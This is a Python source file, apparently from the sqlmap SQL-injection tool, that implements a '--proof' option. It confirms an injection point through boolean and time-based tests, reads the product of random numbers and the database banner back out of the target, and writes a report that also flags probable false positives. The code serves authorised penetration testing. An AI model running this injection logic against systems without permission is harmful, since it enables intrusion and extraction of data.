#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import os

from lib.core.common import Backend
from lib.core.common import average
from lib.core.common import openFile
from lib.core.common import randomInt
from lib.core.common import stdev
from lib.core.common import unArrayizeValue
from lib.core.common import urldecode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import EXPECTED
from lib.core.enums import HTTPMETHOD
from lib.core.enums import PAYLOAD
from lib.core.enums import PLACE
from lib.core.settings import INFERENCE_MARKER
from lib.core.settings import SLEEP_TIME_MARKER
from lib.request.inject import getValue

# how many times a true/false condition is re-evaluated to demonstrate repeatability (kills false positives)
PROVE_REPETITIONS = 5

# comparison knobs that decide true/false at request time (lib/request/comparison.py reads these globals,
# not injection.conf); they must be re-pointed at the injection being proven or the oracle returns None
_COMPARISON_ATTRS = ("string", "notString", "regexp", "code", "textOnly", "titles")

# width the field labels are padded to, so the values line up in a clean column
_LABEL_WIDTH = 9


def _field(label, value):
    """
    Renders one 'Label:   value' line (value column aligned), with any extra list items as continuation
    lines indented under the value.
    """

    lines = list(value) if isinstance(value, (list, tuple)) else [value]
    indent = " " * (_LABEL_WIDTH + 2)
    retVal = "%s:%s%s" % (label, " " * (_LABEL_WIDTH - len(label) + 1), lines[0] if lines else "")
    for extra in lines[1:]:
        retVal += "\n%s%s" % (indent, extra)
    return retVal


def _activateInjection(injection):
    """
    Points the global comparison configuration (and kb.injection) at the injection being proven, so the
    boolean oracle / data retrieval use that injection's own distinguishing signal regardless of what the
    globals drifted to during enumeration. Returns the previous state for restoration.
    """

    saved = dict((_, getattr(conf, _)) for _ in _COMPARISON_ATTRS)
    saved["injection"] = kb.injection

    for attr in _COMPARISON_ATTRS:
        setattr(conf, attr, getattr(injection.conf, attr, None))
    kb.injection = injection

    return saved


def _restoreInjection(saved):
    kb.injection = saved.pop("injection")
    for attr, value in saved.items():
        setattr(conf, attr, value)


def _booleanOracle(expression):
    """
    Evaluates a boolean expression strictly through the boolean (inferential) technique. UNION/error are
    forced off on purpose: for a multi-technique injection getValue() would try those first, and a WAF/IPS
    that blocks their function-heavy payloads makes them return None, which (with expectingNone) short-
    circuits the whole call before the boolean technique is ever reached - the real cause of a 0/0 reading.
    """

    return getValue(expression, expected=EXPECTED.BOOL, charsetType=CHARSET_TYPE.BINARY, suppressOutput=True, expectingNone=True, union=False, error=False, time=False)


def _signalArtifacts(expression):
    """
    Evaluates 'expression' through the boolean oracle and reads back the (HTTP code, page <title>) of the
    response it produced (queryPage stores both in thread data), so the boolean proof can quote the actual
    TRUE/FALSE codes and titles rather than a generic flag. Returns (None, None) on any error.
    """

    from lib.core.common import extractRegexResult, getCurrentThreadData
    from lib.core.settings import HTML_TITLE_REGEX

    try:
        _booleanOracle(expression)
        threadData = getCurrentThreadData()
        return threadData.lastCode, (extractRegexResult(HTML_TITLE_REGEX, threadData.lastPage or "") or "").strip()
    except Exception:
        return None, None


def _proveBoolean(injection, signal=None):
    """
    Demonstrates deterministic boolean control, rendered with the distinguishing signal sqlmap already
    auto-selected (--string / --code / --title), repeated to show it is stable (not a fluke). The signal
    line quotes the actual distinguishing artifact: the matched string, the two HTTP codes, or the two
    page titles - so a reader sees exactly what tells TRUE from FALSE.

    When a mutable 'signal' dict is supplied it is filled with the distinguishing artifact (code-based?
    and the TRUE/FALSE HTTP codes) so the caller can tell a genuine signal from a blocked-response (WAF)
    artifact - a TRUE condition that yields an HTTP 4xx is a block, not a database answer.
    """

    retVal = []
    n = randomInt()

    trues = sum(1 for _ in range(PROVE_REPETITIONS) if _booleanOracle("%d=%d" % (n, n)))
    falses = sum(1 for _ in range(PROVE_REPETITIONS) if _booleanOracle("%d=%d" % (n, n + 1)) is False)

    line = "condition %d=%d returns TRUE (%d/%d) while %d=%d returns FALSE (%d/%d)" % (n, n, trues, PROVE_REPETITIONS, n, n + 1, falses, PROVE_REPETITIONS)
    if trues == PROVE_REPETITIONS and falses == PROVE_REPETITIONS:
        line += ", repeatably"          # only claim repeatability when every repetition agreed
    retVal.append(line)

    trueCode = trueTitle = falseCode = falseTitle = None
    if injection.conf.code or injection.conf.titles:           # fetch the real artifacts only when the signal needs them
        trueCode, trueTitle = _signalArtifacts("%d=%d" % (n, n))
        falseCode, falseTitle = _signalArtifacts("%d=%d" % (n, n + 1))

    if signal is not None:
        signal["codeBased"] = bool(injection.conf.code)
        signal["trueCode"], signal["falseCode"] = trueCode, falseCode

    if injection.conf.string:
        retVal.append("the response contains %s only when the condition is TRUE" % repr(injection.conf.string).lstrip('u'))
    elif injection.conf.notString:
        retVal.append("the response contains %s only when the condition is FALSE" % repr(injection.conf.notString).lstrip('u'))
    elif injection.conf.code:
        if trueCode and falseCode and trueCode != falseCode:
            retVal.append("the response returns HTTP %s when the condition is TRUE and HTTP %s when it is FALSE" % (trueCode, falseCode))
        else:
            retVal.append("the response returns HTTP %s only when the condition is TRUE (a different code otherwise)" % injection.conf.code)
    elif injection.conf.titles:
        if trueTitle and falseTitle and trueTitle != falseTitle:
            retVal.append("the page title is %s when the condition is TRUE and %s when it is FALSE" % (repr(trueTitle).lstrip('u'), repr(falseTitle).lstrip('u')))
        else:
            retVal.append("the page <title> differs between the TRUE and FALSE responses")
    else:
        retVal.append("the TRUE response matches the original page while the FALSE one differs (content similarity)")

    return retVal


def _proveTime(injection):
    """
    Demonstrates time-based blind in plain IT language (jitter / latency / controlled delay), keeping the
    statistics under the hood. Where the payload uses a parameterizable delay (SLEEP(n)/pg_sleep(n)/WAITFOR),
    it sweeps the injected delay (0 / T / 2T seconds) and shows the response time tracks it ~1:1 - a controlled
    delay that network latency or a slow page cannot reproduce. Otherwise (heavy-query delays) it falls back to
    a baseline-vs-jitter statement.
    """

    from lib.core.agent import agent
    from lib.core.common import getCurrentThreadData, popValue, pushValue
    from lib.request.connect import Connect as Request

    retVal = []
    stype = PAYLOAD.TECHNIQUE.TIME if PAYLOAD.TECHNIQUE.TIME in injection.data else PAYLOAD.TECHNIQUE.STACKED
    vector = (injection.data.get(stype) or {}).get("vector")

    def _baselineStatement():
        baseline = kb.responseTimes.get(kb.responseTimeMode) or []
        if len(baseline) >= 2:
            return "a TRUE condition delays the response well beyond the target's normal latency ~%.3fs (jitter ~%.3fs), repeatably" % (average(baseline), stdev(baseline))
        return "a TRUE condition delays the response well beyond the target's normal latency and jitter, repeatably"

    if not (vector and SLEEP_TIME_MARKER in vector):
        retVal.append(_baselineStatement())
        return retVal

    n = randomInt()
    base = conf.timeSec or 5
    measurements = []

    benign = []
    for _ in range(3):
        try:
            Request.queryPage(timeBasedCompare=True, raise404=False, silent=True)
            benign.append(getCurrentThreadData().lastQueryDuration)
        except Exception:
            pass
    for k in (0, base, 2 * base):
        pushValue(conf.timeSec)
        conf.timeSec = k
        try:
            query = agent.suffixQuery(agent.prefixQuery(vector.replace(INFERENCE_MARKER, "%d=%d" % (n, n))))
            Request.queryPage(agent.payload(newValue=query), timeBasedCompare=True, raise404=False, silent=True)
            measurements.append((k, getCurrentThreadData().lastQueryDuration))
        except Exception:
            measurements.append((k, None))
        finally:
            conf.timeSec = popValue()

    if any(d is None for _, d in measurements):
        retVal.append(_baselineStatement())
        return retVal

    d0, dT, d2T = (measurements[0][1], measurements[1][1], measurements[2][1])
    baseAvg = average(benign) if benign else d0
    baseStd = stdev(benign) if len(benign) >= 2 else 0.0

    # only claim 1:1 scaling if the measurements actually track the injected seconds: 0s stays near baseline,
    # Ts ~ T, 2Ts ~ 2T, monotonic. A heavy-query delay (e.g. SQLite RANDOMBLOB) also rides [SLEEPTIME] but
    # does NOT scale linearly, so it must NOT be rendered as 1:1 (its sweep is noisy / non-monotonic)
    linear = d0 < max(0.5, base * 0.5) and abs(dT - base) <= base * 0.5 and abs(d2T - 2 * base) <= base * 0.6 and d2T > dT

    if linear:
        retVal.append("normal response ~%.3fs (jitter ~%.3fs); injected delay %s" % (baseAvg, baseStd, "  ".join("%ds -> %.2fs" % (k, d) for k, d in measurements)))
        retVal.append("the response slows ~1:1 with the injected delay - a controlled delay that network latency or a slow page cannot reproduce (the 0s case returns at normal speed)")
    else:
        retVal.append("a TRUE condition makes the response take ~%.2fs versus ~%.3fs normal (jitter ~%.3fs), repeatably" % (max(dT, d2T), baseAvg, baseStd))
        retVal.append("a FALSE condition returns at normal speed - a sustained delay neither network latency nor a slow page reproduces")

    return retVal


def _retrieveProof():
    """
    Reads values back through the injection to prove it - DBMS-agnostic, weakest-to-strongest:

      1. a random arithmetic product (e.g. 48391*60128): every SQL engine evaluates it, it needs no
         table/function/FROM (valid even on Oracle), so its WAF surface is tiny - yet the operands are
         random, so reading the exact product back proves the back-end actually executed injected SQL
         (not a reflected constant);
      2. the DBMS banner: a real datum the application never returns on its own (the strongest proof).

    Whatever evasion the run already adopted (tamper scripts) applies here too - this is not tied to any one
    DBMS or tamper. Returns a list of (label, text) rungs; both, one, or none may be present.
    """

    from lib.request import inject

    retVal = []

    a, b = randomInt(4), randomInt(4)   # 4-digit operands: product stays < 2^31 so it never overflows a 32-bit INT (e.g. PostgreSQL int4), yet is unguessable
    try:
        result = inject.getValue("%d*%d" % (a, b), expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS, resumeValue=False, suppressOutput=True)
    except Exception:
        result = None
    if result is not None and ("%s" % result).strip() == str(a * b):
        retVal.append(("Computed", "%d*%d = %d returned by the back-end - it executed the injected SQL (works on any DBMS)" % (a, b, a * b)))

    label = value = None
    for requested, candidate, lbl in (                          # reuse a value the user's own switches already pulled
        (conf.getBanner, getattr(kb.data, "banner", None), "back-end DBMS banner"),
        (conf.getCurrentUser, getattr(kb.data, "currentUser", None), "current database user"),
        (conf.getCurrentDb, getattr(kb.data, "currentDb", None), "current database"),
    ):
        if requested and candidate:
            label, value = lbl, unArrayizeValue(candidate)
            break

    if value is None:
        dbms = Backend.getIdentifiedDbms()
        banner = getattr(queries.get(dbms), "banner", None) if dbms else None
        query = getattr(banner, "query", None) if banner else None
        if query:
            try:
                value = unArrayizeValue(inject.getValue(query, safeCharEncode=False, suppressOutput=True))
                label = "back-end DBMS banner"
            except Exception:
                value = None

    if value:
        retVal.append(("Retrieved", "%s %s - a real value read out of the back-end (the strongest proof)" % (label, repr(value).lstrip('u'))))

    return retVal


def proveExploitation():
    """
    Renders a report-grade, best-effort demonstration of exploitation for the confirmed injection point
    (option '--proof'), in the same style as sqlmap's injection-point summary so it reads naturally: the
    target URL and the confirmed injection point (parameter / type / title / payload), then the strongest
    proof first - an actual value read out of the back-end (drilling from the plain read to a more evasive
    one so a WAF/IPS does not stop it) - backed by a deterministic boolean differential (rendered with the
    distinguishing --string/--code/--title signal) or a statistical time-based demonstration. Written both
    to stdout and to '<output>/proof.txt'.
    """

    if not kb.injections or not any(getattr(_, "place", None) for _ in kb.injections):
        return

    injection = kb.injection if getattr(kb.injection, "place", None) else kb.injections[0]

    signal = {}
    saved = _activateInjection(injection)
    try:
        if PAYLOAD.TECHNIQUE.BOOLEAN in injection.data:
            stype = PAYLOAD.TECHNIQUE.BOOLEAN
            proof = _proveBoolean(injection, signal)
        elif PAYLOAD.TECHNIQUE.TIME in injection.data or PAYLOAD.TECHNIQUE.STACKED in injection.data:
            stype = PAYLOAD.TECHNIQUE.TIME if PAYLOAD.TECHNIQUE.TIME in injection.data else PAYLOAD.TECHNIQUE.STACKED
            proof = _proveTime(injection)
        elif PAYLOAD.TECHNIQUE.ERROR in injection.data:
            stype = PAYLOAD.TECHNIQUE.ERROR
            proof = ["the back-end error message returns the requested value directly"]
        elif PAYLOAD.TECHNIQUE.UNION in injection.data:
            stype = PAYLOAD.TECHNIQUE.UNION
            proof = ["the requested value is rendered inside the application response"]
        else:
            stype = next(iter(injection.data), None)
            proof = []

        rungs = _retrieveProof()
    finally:
        _restoreInjection(saved)

    from lib.core.agent import agent

    target = conf.url or ""
    if conf.parameters.get(PLACE.GET) and "?" not in target:        # spell out the full GET target, not just the path
        target += "?%s" % conf.parameters[PLACE.GET]

    paramType = conf.method if conf.method not in (None, HTTPMETHOD.GET, HTTPMETHOD.POST) else injection.place
    sdata = injection.data.get(stype)

    fields = [_field("Target", target)]
    if conf.parameters.get(PLACE.POST):
        fields.append(_field("Data", conf.parameters[PLACE.POST]))
    fields.append(_field("Parameter", "%s (%s)" % (injection.parameter, paramType)))
    if sdata is not None:
        fields.append(_field("Technique", PAYLOAD.SQLINJECTION[stype]))
        if sdata.payload:
            payload = urldecode(agent.adjustLateValues(sdata.payload), unsafe="&", spaceplus=(injection.place != PLACE.GET and kb.postSpaceToPlus))
            fields.append(_field("Payload", payload))
    # Reading a value back out of the back-end is the GATE, not a bonus: it is the only thing that
    # distinguishes a real injection from a differential that merely correlates with the payload. A
    # WAF/IPS that answers blocked payloads with a distinct HTTP status (e.g. 403 when TRUE, 200 when
    # FALSE) reproduces a perfect, repeatable boolean differential WITHOUT any SQL ever executing - so
    # the differential alone is exactly the signal detection already (mis)read. If nothing could be read
    # back, exploitation is NOT proven; say so plainly instead of echoing the detection verdict.
    proven = bool(rungs)

    if proven:
        if proof:
            fields.append(_field("Proof", proof))
        for label, text in rungs:
            fields.append(_field(label, text))
        header = "sqlmap proved exploitation of the following injection point"
    else:
        if proof:
            fields.append(_field("Observed", proof))     # the differential is observed, but unconfirmed
        suspectWaf = bool(signal.get("codeBased")) and (signal.get("trueCode") or 0) >= 400
        wafInterfering = suspectWaf or kb.droppingRequests or bool(kb.identifiedWafs)
        verdict = ["no value could be read back through the injection (tried a random arithmetic product and the DBMS banner)"]
        if suspectWaf:
            verdict.append("the TRUE/FALSE difference is only an HTTP %s (blocked) response - characteristic of a WAF/IPS, not a database answer" % signal.get("trueCode"))
        if wafInterfering:
            # behind a WAF, an unconfirmed read-back is ambiguous: a genuine injection whose data-retrieval
            # payloads are being blocked looks the same as a pure WAF artifact - so don't assert "false
            # positive", point the user at the way to disambiguate instead
            verdict.append("a WAF/IPS is interfering: this may be a real injection whose data-retrieval is blocked, or a false positive")
            verdict.append("=> exploitation is NOT proven; re-test directly (no WAF) or with --tamper, then re-prove")
        else:
            verdict.append("=> exploitation is NOT proven; the reported injection is likely a FALSE POSITIVE")
        fields.append(_field("Verdict", verdict))
        header = "sqlmap could NOT prove exploitation of the reported injection point"

    data = "\n".join(fields)
    conf.dumper.string(header, data)

    try:
        path = os.path.join(conf.outputPath or ".", "proof.txt")
        with openFile(path, "w+") as f:
            f.write("%s:\n---\n%s\n---\n" % (header, data))
        logger.info("proof of exploitation written to '%s'" % path)
    except Exception:
        pass
